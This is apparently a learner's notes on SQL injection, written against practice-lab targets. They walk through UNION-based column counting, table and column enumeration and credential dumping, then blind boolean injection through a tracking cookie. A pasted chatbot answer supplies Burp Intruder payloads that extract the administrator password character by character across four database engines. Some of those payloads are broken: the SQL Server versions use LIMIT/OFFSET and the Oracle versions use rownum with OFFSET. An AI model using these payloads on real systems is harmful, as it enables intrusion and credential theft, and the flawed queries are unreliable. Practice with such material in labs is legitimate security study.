SQLi(full version)
(checkout portswigger SQLi cheatsheet)
https://portswigger.net/web-security/sql-injection/cheat-sheet
select table_name and column_name not *

https://insecure-website.com/products?category=Gifts'+OR+1=1--

This results in the SQL query:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

csrf=7SPxzGnSXOciUDIY4cCaQ52E7ilIWdcy&username=administrator&password=test'OR+1=1--

(union attk)
1.determine number of column 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
The ORDER BY position number 3 is out of range of the number of items in the select list.

alternative way (preffered)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

on oracle every select must have from so 
' UNION SELECT NULL FROM DUAL--

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

add NULL until it does not display internal error
<img width="706" height="862" alt="image" src="https://github.com/user-attachments/assets/1b92b4e3-ce88-43c9-a753-93045e72908d" />

2. after known how many column see which column can store string [because string might contain data we want]
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

if not compatible the website will tell 
Conversion failed when converting the varchar value 'a' to data type int.
To retrieve string hNhDWH
category=Accessories'+union+select+NULL,'hNhDWH',NULL--

3.retrieve interesting data
[all those are in sqli cheatsheet]
--database comment
Oracle	--comment
Microsoft	--comment
/*comment*/
PostgreSQL	--comment
/*comment*/
MySQL	#comment
-- comment [Note the space after the double dash]
/*comment*/

--database version
Microsoft, MySQL 	SELECT @@version
Oracle 	          SELECT * FROM v$version
PostgreSQL 	      SELECT version() 

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables--
then we know got users table

-- List columns for users table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
then we know got username and password column

+union+select+username,password+from+users--

administrator
n3opjkr0wagewkqjmwj5
<img width="1076" height="793" alt="image" src="https://github.com/user-attachments/assets/ed28ed9d-d8be-4755-ab1b-9417d10ddc20" />

if only have one column is string we cannot put usrname,passowrd instead we put
'+union+select+'1',username+||+':'+||+password+from+users--

administrator:j04nuqju3nsugk7ruq7l

check the version since '+union+SELECT+NULL,NULL--+ works =MySQL
<img width="1678" height="597" alt="image" src="https://github.com/user-attachments/assets/a9460593-f35e-4c86-a54b-39d73f3330b2" />
then we see the version with '+union+SELECT+@@version,NULL--+ solved!


administrator
584qskakz74owwwn1u75

SELECT a, b FROM table1 UNION SELECT c, d FROM table2

This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2. 
 For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

(BLIND SQLi)
union method not effective (use burpsuite)
1.Cookie: TrackingId=xyz' AND '1'='2 
if the welcome back message still appear if no then we can use blind sql injection

1.determine version SEE GOT WELCOME BACK MSG ANOT or similar response
TrackingId=xyz
' AND (SELECT @@version) IS NOT NULL --(space)  (MySQL)(microsoft)
' AND (SELECT version()) IS NOT NULL --   (PostgreSQL)
' AND (SELECT * FROM v$version) IS NOT NULL-- (oracle)

2. identify table and column
boolean check for table
' AND (SELECT COUNT(*) FROM users) > 0 -- 

or 

conditional check
' AND (SELECT 'a' FROM users WHERE ROWNUM=1)='a' -- (check user table)
' AND (SELECT username FROM users WHERE ROWNUM=1)='administrator' -- (check column)

or

Excellent! Here's the **complete multi-database version** with Microsoft SQL Server, MySQL, and Oracle equivalents:

## **Complete Multi-Database SQL Injection Guide**

### **Step 1: Find Database Name Character by Character**

#### **PostgreSQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT SUBSTRING(current_database(),§1§,1))='§a§' --
```

#### **MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT SUBSTRING(database(),§1§,1))='§a§' --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT SUBSTRING(db_name(),§1§,1))='§a§' --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT SUBSTR(global_name,§1§,1) FROM global_name WHERE rownum=1)='§a§' --
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9,_

---

### **Step 2: Find All Tables Character by Character**

#### **PostgreSQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(table_name,§1§,1) 
  FROM information_schema.tables 
  WHERE table_schema='public' 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(table_name,§1§,1) 
  FROM information_schema.tables 
  WHERE table_schema=database() 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(table_name,§1§,1) 
  FROM information_schema.tables 
  WHERE table_catalog=db_name() 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTR(table_name,§1§,1) 
  FROM all_tables 
  WHERE owner=(SELECT user FROM dual) 
  AND rownum=1 OFFSET §2§
)='§a§' --
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 3: Find Columns for Specific Table**

#### **PostgreSQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(column_name,§1§,1) 
  FROM information_schema.columns 
  WHERE table_name='users' 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(column_name,§1§,1) 
  FROM information_schema.columns 
  WHERE table_name='users' AND table_schema=database()
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(column_name,§1§,1) 
  FROM information_schema.columns 
  WHERE table_name='users' 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTR(column_name,§1§,1) 
  FROM all_tab_columns 
  WHERE table_name='USERS' 
  AND rownum=1 OFFSET §2§
)='§a§' --
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 4: Find All Usernames (Verify Administrator)**

#### **PostgreSQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(username,§1§,1) 
  FROM users 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(username,§1§,1) 
  FROM users 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(username,§1§,1) 
  FROM users 
  LIMIT 1 OFFSET §2§
)='§a§' --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTR(username,§1§,1) 
  FROM users 
  WHERE rownum=1 OFFSET §2§
)='§a§' --
```

**Burp Setup:** Cluster bomb with positions 1-20, 0-10, and a-z,0-9,_

---

### **Step 5: Find Password Length**

#### **PostgreSQL & MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT LEN(password) FROM users WHERE username='administrator')=§1§ --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§1§ --
```

**Burp Setup:** Sniper with numbers 1-50

---

### **Step 6: Extract Password Character by Character**

#### **PostgreSQL & MySQL:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(password,§1§,1) 
  FROM users 
  WHERE username='administrator'
)='§a§' --
```

#### **Microsoft SQL Server:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTRING(password,§1§,1) 
  FROM users 
  WHERE username='administrator'
)='§a§' --
```

#### **Oracle:**
```sql
TrackingId=7HPzKjU73Gg8cD5Z' AND (
  SELECT SUBSTR(password,§1§,1) 
  FROM users 
  WHERE username='administrator'
)='§a§' --
```

**Burp Setup:** Cluster bomb with positions 1-20 and a-z,0-9

---

## **Quick Database Detection Queries:**

```sql
-- PostgreSQL
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT version()) IS NOT NULL --

-- MySQL
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT @@version) IS NOT NULL --

-- Microsoft SQL Server
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT @@version) IS NOT NULL --

-- Oracle
TrackingId=7HPzKjU73Gg8cD5Z' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL --
```

## **Database-Specific Notes:**

### **MySQL:**
- Use `database()` instead of current_database()
- Table/column names might be case-sensitive

### **Microsoft SQL Server:**
- Use `db_name()` for database name
- Use `LEN()` instead of `LENGTH()`
- May need to handle XML if errors are shown

### **Oracle:**
- Use `SUBSTR()` instead of `SUBSTRING()`
- Use `rownum` for limiting rows
- Table names are usually UPPERCASE
- Complex database name extraction

### **PostgreSQL:**
- Use `current_database()`
- Use `SUBSTRING()` and `LENGTH()`
- Schema is usually 'public'

## **Burp Intruder Optimization:**

1. **Grep Match:** "Welcome back" 
2. **Attack Type:** Cluster bomb for character extraction
3. **Payloads:** 
   - Numbers: 1-20 (positions)
   - Numbers: 0-10 (offsets) 
   - Characters: a-z, 0-9, _ (sometimes -, ., @)

This complete guide covers all major databases for blind SQL injection!
2.TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Verify that the condition is true, confirming that there is a table called users.

3.TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Verify that the condition is true, confirming that there is a user called administrator.

.TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm
This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.

